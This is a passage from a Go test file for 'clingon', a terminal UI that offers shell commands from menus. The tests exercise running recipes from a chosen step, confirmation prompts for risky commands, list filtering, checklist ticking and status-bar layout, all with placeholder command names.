	if len(sent) != 1 || m.run != nil || !strings.Contains(m.errMsg, "not added") || len(m.recipe) != 2 {
		t.Errorf("sent %v, run %+v, err %q, recipe %d steps", sent, m.run, m.errMsg, len(m.recipe))
	}
}

func TestRunningARecipeFromAPosition(t *testing.T) {
	cmds := []config.Command{
		{Name: "bad", Cmd: "bad"},
		{Name: "one", Cmd: "one"},
		{Name: "risky", Cmd: "risky", Risk: config.RiskWarn},
		{Name: "two", Cmd: "two"},
	}
	var sent []string
	failed, known := false, true
	m := New(Options{
		Config: &config.Config{Sections: []config.Section{{Name: "S", Icon: "•", Category: config.Other, Commands: cmds}}},
		Send:   func(c string) error { sent = append(sent, c); return nil }, WaitIdle: func() bool { return true },
		LastFailed: func() (bool, bool) { return failed, known }, Shell: func() ShellState { return ShellState{} },
		Builtin: func() []*config.Section {
			return []*config.Section{{Name: RecipesSection, Icon: "•", Category: "Clingon", Groups: []config.Group{{Name: "Current recipe"}}}}
		}})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	on := func(name string) {
		t.Helper()
		for i, it := range m.list.view {
			if it.title == name {
				m.list.cursor = i
				return
			}
		}
		t.Fatalf("no row %q", name)
	}
	right := func() { t.Helper(); m.Update(tea.KeyPressMsg{Code: tea.KeyRight}) }
	done := func() { t.Helper(); m.Update(idleMsg{seq: m.run.seq, ok: true}) }
	sentIs := func(want string) {
		t.Helper()
		if got := strings.Join(sent, " "); got != want {
			t.Errorf("sent %q, want %q", got, want)
		}
	}
	build := func(names ...string) {
		t.Helper()
		m.Update(typed("x"))
		m.showSection(&m.opt.Config.Sections[0])
		for i, name := range names {
			on(name)
			m.Update(typed(fmt.Sprint(i + 1)))
		}
		m.Update(typed("r"))
		sent, m.errMsg, m.hint = nil, "", ""
		failed, known = false, true
	}
	cursorOn := func() string { return m.list.view[m.list.cursor].title }

	// Only Run recipe and the commands: no rows of their own for carrying on.
	build("one", "bad", "two")
	if cursorOn() != "Run recipe" {
		t.Fatalf("cursor on %q", cursorOn())
	}
	for _, it := range m.list.view {
		if strings.Contains(it.title, "Retry") || strings.Contains(it.title, "Skip") {
			t.Errorf("row %q", it.title)
		}
	}

	// A command's row runs the recipe from there, and says so.
	on("bad")
	if _, desc := m.details(); !strings.Contains(desc, "from here, command 2 of 3") {
		t.Errorf("desc %q", desc)
	}
	right()
	sentIs("bad")
	done()
	sentIs("bad two")
	done()
	if m.run != nil || !strings.Contains(m.hint, "finished") {
		t.Errorf("run %+v, hint %q", m.run, m.hint)
	}

	// The last one runs alone.
	build("one", "bad", "two")
	on("two")
	right()
	sentIs("two")
	done()
	if m.run != nil {
		t.Errorf("run %+v", m.run)
	}

	// A failure leaves the cursor on what stopped it: enter retries from there.
	build("one", "bad", "two")
	on("Run recipe")
	right()
	sentIs("one")
	done()
	failed = true
	done()
	failed = false
	if m.run != nil || cursorOn() != "bad" || !strings.Contains(m.errMsg, "command 2") {
		t.Fatalf("run %+v, cursor on %q, err %q", m.run, cursorOn(), m.errMsg)
	}
	sent = nil
	right()
	sentIs("bad")
	failed = true
	done() // it can fail again, and stop in the same place
	failed = false
	if m.run != nil || cursorOn() != "bad" {
		t.Fatalf("run %+v, cursor on %q", m.run, cursorOn())
	}
	// ...and the next row skips it.
	sent = nil
	m.Update(tea.KeyPressMsg{Code: tea.KeyDown})
	right()
	sentIs("two")
	done()

	// Going away and coming back still lands there; a changed recipe doesn't.
	build("one", "bad", "two")
	on("bad")
	right()
	failed = true
	done()
	failed = false
	m.showSection(&m.opt.Config.Sections[0])
	m.Update(typed("r"))
	if cursorOn() != "bad" {
		t.Errorf("cursor on %q", cursorOn())
	}
	m.showSection(&m.opt.Config.Sections[0])
	on("risky")
	m.Update(typed("4"))
	m.Update(typed("r"))
	if cursorOn() != "Run recipe" {
		t.Errorf("a changed recipe starts at the top: cursor on %q", cursorOn())
	}

	// Run recipe still starts from the top, and a risky command still asks.
	build("one", "risky", "two")
	on("risky")
	right()
	if m.mode != modeConfirm || len(sent) != 0 {
		t.Fatalf("mode %v, sent %v", m.mode, sent)
	}
	answer(m, false)
	if m.run != nil || cursorOn() != "risky" {
		t.Fatalf("No stops it there: run %+v, cursor on %q", m.run, cursorOn())
	}
	on("Run recipe")
	right()
	sentIs("one")
	m.Update(typed("x"))

	// A result that can't be read stops it too.
	build("one", "bad")
	on("Run recipe")
	right()
	known = false
	done()
	known = true
	if m.run != nil || !strings.Contains(m.errMsg, "couldn't tell if it worked") || cursorOn() != "one" {
		t.Errorf("run %+v, err %q, cursor on %q", m.run, m.errMsg, cursorOn())
	}
}

// answer picks No or Yes on a prompt the way you do: move to it, press enter.
func answer(m *Model, yes bool) {
	for i := 0; i < 200 && m.yes != yes; i++ {
		m.Update(tea.KeyPressMsg{Code: tea.KeyDown})
	}
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
}

// No prompt takes a letter for an answer: y and n aren't keys.
func TestPromptsIgnoreYAndN(t *testing.T) {
	for _, mode := range []mode{modeQuit, modeSave, modeTyped, modeConfirm, modeTrust} {
		for _, k := range []string{"y", "Y", "n", "N"} {
			var sent []string
			m := New(Options{Config: &config.Config{Sections: []config.Section{{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{{Name: "a", Cmd: "a"}}}}},
				Send: func(c string) error { sent = append(sent, c); return nil }})
			m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
			m.showSection(&m.opt.Config.Sections[0])
			m.mode = mode
			m.pending = &pending{sec: m.section, section: "S", name: "a", cmd: "a", shown: "a", risk: config.RiskWarn}
			m.recipe = []recipeStep{{"a", cmdRef{"S", m.section, &m.opt.Config.Sections[0].Commands[0]}}}
			m.trustMax = 0 // Yes is open
			m.Update(typed(k))
			if m.mode != mode || m.Quit || len(sent) != 0 || m.run != nil {
				t.Errorf("mode %v, key %q: now mode %v, quit %v, sent %v, run %+v", mode, k, m.mode, m.Quit, sent, m.run)
			}
		}
	}
}

// With the bar in its own pane, browsing leaves nothing under the info pane:
// no keys and no rule, and the view still fills the menu's pane exactly. A
// prompt keeps its keys, under the rule.
func TestBrowsingHasNoFooter(t *testing.T) {
	m := New(Options{Config: &config.Config{Sections: []config.Section{{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{{Name: "r", Cmd: "r", Risk: config.RiskWarn}}}}},
		Send: func(string) error { return nil }, Bar: func(string) {}, BarWidth: func() int { return 80 }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.showSection(&m.opt.Config.Sections[0])
	lines := func() []string { return strings.Split(ansi.Strip(m.view()), "\n") }
	got := lines()
	if len(got) != 40 {
		t.Errorf("view is %d lines, want 40", len(got))
	}
	last := strings.TrimSpace(got[len(got)-1])
	if strings.Contains(last, "help") || strings.HasPrefix(last, "─") {
		t.Errorf("nothing should be under the info pane: %q", last)
	}
	if strings.Contains(strings.Join(got, "\n"), "? help") {
		t.Error("? help belongs to the bar's notch")
	}
	for i, it := range m.list.view {
		if it.title == "r" {
			m.list.cursor = i
		}
	}
	m.Update(tea.KeyPressMsg{Code: tea.KeyRight})
	got = lines()
	if len(got) != 40 || strings.TrimSpace(got[len(got)-1]) != "↑↓ choose · enter select" || !strings.HasPrefix(got[len(got)-2], "─") {
		t.Errorf("a prompt keeps its keys under the rule: %d lines, ending %q", len(got), got[len(got)-2:])
	}
}

// Every list filters the same way: / opens it, it's the first line, and nothing
// else types into it.
func TestEveryListFiltersTheSameWay(t *testing.T) {
	sec := config.Section{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{
		{Name: "pick", Cmd: "pick <x>", Desc: "Picks <x>.", Args: []config.Arg{{Name: "x", Options: []config.Option{
			{Value: "apple", Label: "A fruit"}, {Value: "apple/core", Label: "The middle", Indent: true}, {Value: "banana", Label: "Also a fruit"},
		}}}},
		{Name: "multi", Cmd: "multi <y>", Args: []config.Arg{{Name: "y", Type: "flags", Options: []config.Option{{Value: "-a"}, {Value: "-b"}}}}},
	}}
	var sent []string
	m := New(Options{Config: &config.Config{Sections: []config.Section{sec}}, Send: func(c string) error { sent = append(sent, c); return nil }, WaitIdle: func() bool { return true }, Shell: func() ShellState { return ShellState{} }})
	m.Update(tea.WindowSizeMsg{Width: 70, Height: 40})
	m.showSection(&m.opt.Config.Sections[0])
	key := func(c rune) { m.Update(tea.KeyPressMsg{Code: c}) }
	open := func(name string) {
		t.Helper()
		m.Update(tea.KeyPressMsg{Code: tea.KeyEscape})
		m.mode, m.job = modeBrowse, nil
		m.showSection(&m.opt.Config.Sections[0])
		for i, it := range m.list.view {
			if it.title == name {
				m.list.cursor = i
			}
		}
		key(tea.KeyRight)
		if m.job == nil || !m.job.usePick {
			t.Fatalf("%s should ask with a list", name)
		}
	}
	// The filter's line, under the header's two lines and the path.
	filterRow := func() string {
		t.Helper()
		lines := strings.Split(ansi.Strip(m.view()), "\n")
		for i, l := range lines {
			if strings.HasPrefix(l, "❯") {
				l = regexp.MustCompile(`\s+\d+( of \d+)? \w+$`).ReplaceAllString(l, "") // the list's size isn't the filter
				return fmt.Sprintf("%d %s", i, strings.TrimSpace(l))
			}
		}
		t.Fatalf("no filter line:\n%s", strings.Join(lines, "\n"))
		return ""
	}
	browse := filterRow()
	if !strings.HasSuffix(browse, "❯ / to filter") {
		t.Fatalf("browse: %q", browse)
	}
	open("pick")
	if got := filterRow(); got != browse {
		t.Errorf("the filter should be in the same place: %q, and in the menu %q", got, browse)
	}
	// Typing does nothing but say what does.
	m.Update(typed("b"))
	if m.job.pick.filtering || m.job.pick.query() != "" || !strings.Contains(m.hint, "Press / to filter") {
		t.Errorf("filtering %v, query %q, hint %q", m.job.pick.filtering, m.job.pick.query(), m.hint)
	}
	if m.job.pick.selected().title != "apple" {
		t.Errorf("selected %q", m.job.pick.selected().title)
	}
	// It's said until the next key, in a list as in the menu.
	key(tea.KeyDown)
	if m.hint != "" {
		t.Errorf("hint %q", m.hint)
	}
	key(tea.KeyUp)

	// The parts are indented; the description says what's highlighted.
	if view := ansi.Strip(m.view()); !strings.Contains(view, "    apple/core") || !strings.Contains(view, "Picks apple. A fruit.") {
		t.Errorf("view:\n%s", view)
	}
	key(tea.KeyDown)
	if view := strings.Join(strings.Fields(ansi.Strip(m.view())), " "); !strings.Contains(view, "Picks apple/core. The middle.") {
		t.Errorf("view:\n%s", view)
	}
	key(tea.KeyUp)

	// / opens it, and the footer says how to stop.
	m.Update(typed("/"))
	if !m.job.pick.filtering || !strings.Contains(ansi.Strip(m.footer(70)), "/ stop filtering") {
		t.Fatalf("filtering %v, footer %q", m.job.pick.filtering, ansi.Strip(m.footer(70)))
	}
	m.Update(typed("b"))
	if m.job.pick.selected().title != "banana" {
		t.Errorf("selected %q", m.job.pick.selected().title)
	}
	// / again closes it and keeps it, without leaving the command.
	m.Update(typed("/"))
	if m.job == nil || m.job.pick.filtering || m.job.pick.query() != "b" {
		t.Error("/ should close the filter and keep it")
	}
	key(tea.KeyEscape)
	m.Update(typed("/b"))
	if !m.job.pick.filtering || m.job.pick.query() != "b" {
		t.Errorf("fast typing: query %q", m.job.pick.query())
	}
	key(tea.KeyEscape)
	if m.mode != modeFill || m.job.pick.filtering {
		t.Errorf("esc should close the filter first: mode %v", m.mode)
	}
	m.Update(typed("/"))
	m.Update(tea.KeyPressMsg{Code: 'c', Mod: tea.ModCtrl})
	if m.mode != modeFill || m.job.pick.filtering {
		t.Errorf("ctrl-c should close the filter first: mode %v", m.mode)
	}
	m.Update(tea.KeyPressMsg{Code: 'c', Mod: tea.ModCtrl})
	if m.mode != modeBrowse {
		t.Errorf("and then the command: mode %v", m.mode)
	}

	// A checklist still ticks with space, filter open or not, and says nothing.
	open("multi")
	key(tea.KeySpace)
	if m.job.pick.filtering || len(m.job.pick.values()) != 1 || m.hint != "" {
		t.Errorf("values %v, hint %q", m.job.pick.values(), m.hint)
	}
}

// The version sits at the bar's right, in the same chip as help, and makes way
// when the message needs the room.
func TestStatusBarShowsTheVersion(t *testing.T) {
	m := New(Options{Config: &config.Config{Sections: []config.Section{{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{{Name: "a", Cmd: "a"}}}}}, Version: "v1.2.3"})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	line := m.statusBar(100)
	if got := ansi.Strip(line); !strings.HasPrefix(got, " ? help ") || !strings.HasSuffix(got, " v1.2.3 ") {
		t.Errorf("bar %q", got)
	}
	if w := ansi.StringWidth(line); w != 100 {
		t.Errorf("the bar is %d wide", w)
	}
	if narrow := ansi.Strip(m.statusBar(45)); strings.Contains(narrow, "v1.2.3") || !strings.HasPrefix(narrow, " ? help ") {
		t.Errorf("narrow bar %q", narrow)
	}
	if got := ansi.StringWidth(m.statusBar(45)); got != 45 {
		t.Errorf("the narrow bar is %d wide", got)
	}
	if strings.Contains(ansi.Strip(m.view()), "v1.2.3\n") && strings.HasPrefix(ansi.Strip(m.view()), "v1.2.3") {
		t.Error("the version shouldn't be by the logo")
	}
	// The way there starts with the category, with no arrow in front of it.
	m.showSection(&m.opt.Config.Sections[0])
	view := ansi.Strip(m.view())
	if strings.Contains(view, "‹") || !strings.Contains(view, "Other ›") {
		t.Errorf("breadcrumb:\n%s", view)
	}
}

// The command's heading says how many blanks it has, while choosing and filling
// in; one with none doesn't mention it.
func TestCommandHeadingSaysHowManySteps(t *testing.T) {
	m := New(Options{Config: &config.Config{Sections: []config.Section{{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{
		{Name: "a two", Cmd: "x <p> <q>", Args: []config.Arg{{Name: "p"}, {Name: "q"}}},
		{Name: "b one", Cmd: "y <p>", Args: []config.Arg{{Name: "p"}}},
		{Name: "c none", Cmd: "z"},
	}}}}, Send: func(string) error { return nil }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.showSection(&m.opt.Config.Sections[0])
	heading := func() string {
		t.Helper()
		for _, l := range strings.Split(ansi.Strip(m.view()), "\n") {
			if f := strings.Fields(l); len(f) > 0 && f[0] == "COMMAND" {
				// The note is at the far right, as the filter row's count is.
				if f := strings.Fields(l); len(f) > 1 && !strings.HasSuffix(strings.TrimRight(l, "│ "), f[len(f)-1]) {
					t.Errorf("not right-aligned: %q", l)
				}
				return strings.Join(strings.Fields(l), " ")
			}
		}
		t.Fatal("no COMMAND heading")
		return ""
	}
	want := map[string]string{"a two": "COMMAND 2 steps", "b one": "COMMAND 1 step", "c none": "COMMAND"}
	for i, it := range m.list.view {
		if w, ok := want[it.title]; ok {
			m.list.cursor = i
			if got := heading(); got != w {
				t.Errorf("%s: %q, want %q", it.title, got, w)
			}
		}
	}
	for i, it := range m.list.view {
		if it.title == "a two" {
			m.list.cursor = i
		}
	}
	m.Update(tea.KeyPressMsg{Code: tea.KeyRight})
	if got := heading(); got != "COMMAND 2 steps" {
		t.Errorf("filling in: %q", got)
	}
}

// A section of clingon's own can sit among the packs, under its category, with
// the rest of clingon's below the divider.
func TestCommandLineSitsAmongThePacks(t *testing.T) {
	m := New(Options{Config: &config.Config{Sections: []config.Section{
		{Name: "Git", Icon: "•", Category: "Code", Commands: []config.Command{{Name: "Status", Cmd: "git status"}}},
		{Name: "Pg", Icon: "•", Category: "Databases", Commands: []config.Command{{Name: "Connect", Cmd: "psql"}}},
	}}, Send: func(string) error { return nil }, Builtin: func() []*config.Section {
		return []*config.Section{
			{Name: "Packs", Icon: "•", Category: "Clingon", Commands: []config.Command{{Name: "p", Cmd: "p"}}},
			{Name: CommandLineSection, Icon: "•", Category: config.CommandLine, Groups: []config.Group{{Name: "Custom", Commands: []config.Command{{Name: "Type a command", Cmd: "<c>", Args: []config.Arg{{Name: "c"}}}}}}},
		}
	}})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.showRoot("")
	var rows []string
	for _, it := range m.list.view {
		if it.title != "" {
			rows = append(rows, it.title)
		}
	}
	if got, want := strings.Join(rows, ","), "Code,Git,Command Line,Commands,Databases,Pg,Clingon,Packs"; got != want {
		t.Errorf("rows %s, want %s", got, want)
	}
	for i, it := range m.list.view {
		if it.title == CommandLineSection {
			m.list.cursor = i
		}
	}
	m.Update(tea.KeyPressMsg{Code: tea.KeyRight})
	view := ansi.Strip(m.view())
	if !strings.Contains(view, "Command Line ›") || !strings.Contains(view, "CUSTOM") || !strings.Contains(view, "Type a command") {
		t.Errorf("view:\n%s", view)
	}
}

// The filter's row is on every screen, greyed out where it can't be used, so
// nothing below it moves.
func TestTheFilterRowNeverMoves(t *testing.T) {
	m := New(Options{Config: &config.Config{Sections: []config.Section{{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{
		{Name: "a text", Cmd: "x <p>", Args: []config.Arg{{Name: "p"}}},
		{Name: "b list", Cmd: "y <q>", Args: []config.Arg{{Name: "q", Options: []config.Option{{Value: "one"}, {Value: "two"}}}}},
		{Name: "c risky", Cmd: "z", Risk: config.RiskWarn},
	}}}}, Send: func(string) error { return nil }, Shell: func() ShellState { return ShellState{} }, WaitIdle: func() bool { return true }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	on := func(name string) {
		t.Helper()
		m.Update(tea.KeyPressMsg{Code: tea.KeyEscape})
		m.mode, m.job, m.pending = modeBrowse, nil, nil
		m.showSection(&m.opt.Config.Sections[0])
		for i, it := range m.list.view {
			if it.title == name {
				m.list.cursor = i
			}
		}
	}
	rowOf := func(want string) int {
		t.Helper()
		for i, l := range strings.Split(ansi.Strip(m.view()), "\n") {
			if strings.HasPrefix(strings.TrimSpace(strings.TrimPrefix(l, "▌")), want) {
				return i
			}
		}
		t.Fatalf("no %q:\n%s", want, ansi.Strip(m.view()))
		return -1
	}
	on("a text")
	filter := rowOf("❯ / to filter")
	m.Update(tea.KeyPressMsg{Code: tea.KeyRight})
	if got := rowOf("❯ / to filter"); got != filter {
		t.Errorf("text blank: row %d, want %d", got, filter)
	}
	step := rowOf("Step 1 of 1")
	// / goes in the box: it's a path as often as not.
	m.Update(typed("/"))
	if m.job.input.Value() != "/" {
		t.Errorf("input %q", m.job.input.Value())
	}
	on("b list")
	m.Update(tea.KeyPressMsg{Code: tea.KeyRight})
	if got := rowOf("❯ / to filter"); got != filter {
		t.Errorf("list: row %d, want %d", got, filter)
	}
	if got := rowOf("Step 1 of 1"); got != step {
		t.Errorf("list's step: row %d, want %d", got, step)
	}
	on("c risky")
	m.Update(tea.KeyPressMsg{Code: tea.KeyRight})
	if m.mode != modeConfirm {
		t.Fatalf("mode %v", m.mode)
	}
	if got := rowOf("❯ / to filter"); got != filter {
		t.Errorf("prompt: row %d, want %d", got, filter)
	}
	on("a text")
	m.Update(typed("?"))
	if got := rowOf("❯ / to filter"); got != filter {
		t.Errorf("help: row %d, want %d", got, filter)
	}
	m.Update(typed("x"))
	// The whole view keeps to the window.
	if got := len(strings.Split(m.view(), "\n")); got != 40 {
		t.Errorf("view is %d lines", got)
	}
}

// A checklist that needs a tick won't go on without one.
func TestAtLeastOneNeedsATick(t *testing.T) {
	var sent []string
	m := New(Options{Config: &config.Config{Sections: []config.Section{{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{
		{Name: "add", Cmd: "add <p>", Desc: "Adds <p>.", Args: []config.Arg{{Name: "p", Type: "flags", AtLeastOne: true, Options: []config.Option{{Value: "a", Label: "Alpha"}, {Value: "b", Label: "Beta"}}}}},
	}}}}, Send: func(c string) error { sent = append(sent, c); return nil }, Shell: func() ShellState { return ShellState{} }, WaitIdle: func() bool { return true }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.showSection(&m.opt.Config.Sections[0])
	m.list.cursor = 1
	m.Update(tea.KeyPressMsg{Code: tea.KeyRight})
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	if m.mode != modeFill || len(sent) != 0 || !strings.Contains(m.hint, "select at least one") {
		t.Fatalf("mode %v, sent %v, hint %q", m.mode, sent, m.hint)
	}
	m.Update(tea.KeyPressMsg{Code: tea.KeySpace})
	m.Update(tea.KeyPressMsg{Code: tea.KeyDown})
	m.Update(tea.KeyPressMsg{Code: tea.KeySpace})
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	if len(sent) != 1 || sent[0] != "add a b" {
		t.Fatalf("sent %v", sent)
	}
}

// / closes a filter and keeps it; only esc, ctrl-c or ← throws it away. The same
// in the menu's list and an arg's.
func TestSlashKeepsTheFilter(t *testing.T) {
	sec := config.Section{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{
		{Name: "apple", Cmd: "a"}, {Name: "banana", Cmd: "b"},
		{Name: "pick", Cmd: "pick <x>", Args: []config.Arg{{Name: "x", Options: []config.Option{{Value: "red"}, {Value: "blue"}}}}},
		{Name: "many", Cmd: "many <y>", Args: []config.Arg{{Name: "y", Type: "flags", Options: []config.Option{{Value: "red"}, {Value: "blue"}}}}},
	}}
	var sent []string
	m := New(Options{Config: &config.Config{Sections: []config.Section{sec}}, Send: func(c string) error { sent = append(sent, c); return nil }, WaitIdle: func() bool { return true }, Shell: func() ShellState { return ShellState{} }})
	m.Update(tea.WindowSizeMsg{Width: 70, Height: 40})
	m.showSection(&m.opt.Config.Sections[0])
	esc := tea.KeyPressMsg{Code: tea.KeyEscape}
	m.Update(typed("/"))
	m.Update(typed("ban"))
	m.Update(typed("/"))
	if m.list.filtering || m.list.query() != "ban" || m.list.selected().title != "banana" {
		t.Fatalf("filtering %v, query %q", m.list.filtering, m.list.query())
	}
	view := ansi.Strip(m.view())
	if !strings.Contains(view, "❯ ban") || !strings.Contains(view, "esc to clear") || strings.Contains(view, "apple") {
		t.Errorf("the filter should still show, and apply:\n%s", view)
	}
	if bar := ansi.Strip(m.statusBar(120)); !strings.Contains(bar, "/ edit filter") || !strings.Contains(bar, "esc clear filter") {
		t.Errorf("bar %q", bar)
	}
	// Coming back to the menu doesn't throw it away.
	m.lookAgain()
	if m.list.query() != "ban" {
		t.Errorf("query %q", m.list.query())
	}
	// / opens it again, as it was, to carry on typing.
	m.Update(typed("/"))
	m.Update(typed("a"))
	if !m.list.filtering || m.list.query() != "bana" {
		t.Errorf("filtering %v, query %q", m.list.filtering, m.list.query())
	}
	m.Update(typed("/"))
	// esc clears it, and goes no further: esc again would leave.
	m.Update(esc)
	if m.list.filtered() || m.section == nil || len(m.list.view) < 4 {
		t.Errorf("esc should clear it: filtered %v, section %v", m.list.filtered(), m.section)
	}
	// Nothing typed: / just closes it.
	m.Update(typed("/"))
	m.Update(typed("/"))
	if m.list.filtered() {
		t.Error("an empty filter is no filter")
	}

	// In an arg's list too, ticks surviving.
	for i, it := range m.list.view {
		if it.title == "many" {
			m.list.cursor = i
		}
	}
	m.Update(tea.KeyPressMsg{Code: tea.KeyRight})
	m.Update(typed("/"))
	m.Update(typed("blu"))
	m.Update(typed("/"))
	m.Update(tea.KeyPressMsg{Code: tea.KeySpace})
	if m.job.pick.filtering || m.job.pick.query() != "blu" || len(m.job.pick.values()) != 1 {
		t.Fatalf("filtering %v, query %q, values %v", m.job.pick.filtering, m.job.pick.query(), m.job.pick.values())
	}
	if f := ansi.Strip(m.footer(70)); strings.Contains(f, "filter") {
		t.Errorf("the filter's own row says how: footer %q", f)
	}
	m.Update(esc)
	if m.mode != modeFill || m.job.pick.filtered() || len(m.job.pick.values()) != 1 {
		t.Errorf("esc clears the filter, not the ticks or the command: mode %v, values %v", m.mode, m.job.pick.values())
	}
}

// Ticking a parent ticks what's under it, and it counts once: the whole thing.
func TestTickingAParentTicksItsChildren(t *testing.T) {
	m := New(Options{Config: &config.Config{Sections: []config.Section{{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{
		{Name: "add", Cmd: "add <p>", Args: []config.Arg{{Name: "p", Type: "flags", Options: []config.Option{
			{Value: "aws", Label: "All of AWS"}, {Value: "aws/ecs", Label: "ECS", Indent: true}, {Value: "aws/s3", Label: "S3", Indent: true},
			{Value: "go", Label: "Go"},
		}}}},
	}}}}, Send: func(string) error { return nil }})
	m.Update(tea.WindowSizeMsg{Width: 70, Height: 40})
	m.showSection(&m.opt.Config.Sections[0])
	m.list.cursor = 1
	m.Update(tea.KeyPressMsg{Code: tea.KeyRight})
	space := tea.KeyPressMsg{Code: tea.KeySpace}
	down := tea.KeyPressMsg{Code: tea.KeyDown}
	up := tea.KeyPressMsg{Code: tea.KeyUp}
	vals := func() string { return strings.Join(m.job.pick.values(), " ") }
	marks := func() string {
		var out []string
		for _, l := range strings.Split(ansi.Strip(m.fillView(70, 20)), "\n") {
			if strings.Contains(l, "aws") || strings.Contains(l, "go") {
				out = append(out, strings.Fields(strings.TrimPrefix(l, "▌"))[0])
			}
		}
		return strings.Join(out, " ")
	}
	m.Update(space) // aws
	if got := vals(); got != "aws" {
		t.Errorf("the whole of it, once: %q", got)
	}
	if got := marks(); got != "✓ ✓ ✓ •" {
		t.Errorf("marks %q", got)
	}
	if !strings.Contains(m.job.optionSays(), "All of AWS") || strings.Contains(m.job.optionSays(), "ECS") {
		t.Errorf("says %q", m.job.optionSays())
	}
	// Unticking a child unticks the parent, and leaves the other child.
	m.Update(down)
	m.Update(space) // aws/ecs off
	if got := vals(); got != "aws/s3" {
		t.Errorf("got %q", got)
	}
	if got := marks(); got != "− • ✓ •" {
		t.Errorf("part of it should show: %q", got)
	}
	// Ticking the last child completes the parent.
	m.Update(space) // aws/ecs on
	if got := vals(); got != "aws" {
		t.Errorf("got %q", got)
	}
	// Unticking the parent unticks everything.
	m.Update(up)
	m.Update(space)
	if got := vals(); got != "" {
		t.Errorf("got %q", got)
	}
	// A pack with nothing under it is just itself; ticks survive going back.
	m.Update(down)
	m.Update(down)
	m.Update(down)
	m.Update(space)
	if got := vals(); got != "go" {
		t.Errorf("got %q", got)
	}
}

// Past a couple of ticks a description counts them, and says about the one you're on.
func TestALongChecklistCountsItsTicks(t *testing.T) {
	m := New(Options{Config: &config.Config{Sections: []config.Section{{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{
		{Name: "add", Cmd: "add <p>", Desc: "Installs for <p>.", Args: []config.Arg{{Name: "p", Type: "flags", CountAs: "pack", Options: []config.Option{
			{Value: "aws", Label: "Cloud things"}, {Value: "aws/ecs", Label: "Containers", Indent: true}, {Value: "aws/s3", Label: "Buckets", Indent: true},
			{Value: "git", Label: "Version control"}, {Value: "go", Label: "A language"}, {Value: "node", Label: "Another one"},
		}}}},
	}}}}, Send: func(string) error { return nil }})
	m.Update(tea.WindowSizeMsg{Width: 70, Height: 40})
	m.showSection(&m.opt.Config.Sections[0])
	m.list.cursor = 1
	m.Update(tea.KeyPressMsg{Code: tea.KeyRight})
	space, down := tea.KeyPressMsg{Code: tea.KeySpace}, tea.KeyPressMsg{Code: tea.KeyDown}
	desc := func() string { return ansi.Strip(m.job.describe()) }
	m.Update(space) // aws, and all of it counts once
	if got := desc(); got != "Installs for aws. Cloud things." {
		t.Errorf("one: %q", got)
	}
	m.Update(down)
	m.Update(down)
	m.Update(down) // git
	m.Update(space)
	if got := desc(); got != "Installs for aws git. Cloud things, Version control." {
		t.Errorf("two are still named: %q", got)
	}
	m.Update(down) // go
	m.Update(space)
	if got := desc(); got != "Installs for 3 packs. A language." {
		t.Errorf("three are counted: %q", got)
	}
	m.Update(down) // node, not ticked: what space would add, once
	if got := desc(); got != "Installs for 3 packs. Space adds: Another one." {
		t.Errorf("on an unticked one: %q", got)
	}
	if got := strings.Join(m.job.pick.values(), " "); got != "aws git go" {
		t.Errorf("the command still has them all: %q", got)
	}
	// Once chosen, as on a risky command's prompt, there's no one you're on.
	if got := describe(m.job.ref.cmd, map[string]string{"p": "aws git go"}, map[string]string{"p": "Cloud things, Version control, A language"}, 1, "", ""); got != "Installs for 3 packs." {
		t.Errorf("chosen: %q", got)
	}
}

// A cursor blinks where there's one to see, and nothing ticks where there isn't.
func TestCursorsBlink(t *testing.T) {
	m := New(Options{Config: &config.Config{Sections: []config.Section{{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{
		{Name: "a text", Cmd: "x <p>", Args: []config.Arg{{Name: "p"}}},
		{Name: "b list", Cmd: "y <q>", Args: []config.Arg{{Name: "q", Options: []config.Option{{Value: "one"}}}}},
	}}}}, Send: func(string) error { return nil }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.showSection(&m.opt.Config.Sections[0])
	if m.list.filter.Focused() {
		t.Error("a closed filter has no cursor")
	}
	if _, cmd := m.Update(tea.FocusMsg{}); cmd != nil {
		if msg := cmd(); msg != nil {
			if b, ok := msg.(tea.BatchMsg); ok && len(b) > 0 {
				t.Errorf("coming back to a list with its filter closed shouldn't start a blink: %d commands", len(b))
			}
		}
	}
	if _, cmd := m.Update(typed("/")); cmd == nil || !m.list.filter.Focused() {
		t.Error("/ should start its cursor")
	}
	m.Update(typed("a"))
	if m.list.query() != "a" {
		t.Errorf("query %q", m.list.query())
	}
	m.Update(typed("/"))
	if m.list.filter.Focused() {
		t.Error("closing it should stop its cursor")
	}
	if _, cmd := m.Update(typed("/")); cmd == nil || !m.list.filter.Focused() {
		t.Error("/ should start it again")
	}
	m.Update(typed("b"))
	if m.list.query() != "ab" {
		t.Errorf("typing should carry on: %q", m.list.query())
	}
	m.Update(tea.KeyPressMsg{Code: tea.KeyEscape})
	if m.list.filter.Focused() {
		t.Error("clearing it should stop its cursor")
	}
	if m.list.cursor = 1; m.list.selected().title != "a text" {
		t.Fatalf("on %q", m.list.selected().title)
	}
	if _, cmd := m.Update(tea.KeyPressMsg{Code: tea.KeyRight}); cmd == nil || !m.job.input.Focused() {
		t.Error("a text blank should start its cursor")
	}
	// It stops when focus leaves the menu, and starts again when it's back.
	m.Update(tea.BlurMsg{})
	if m.job.input.Focused() {
		t.Error("only the focused pane's cursor blinks")
	}
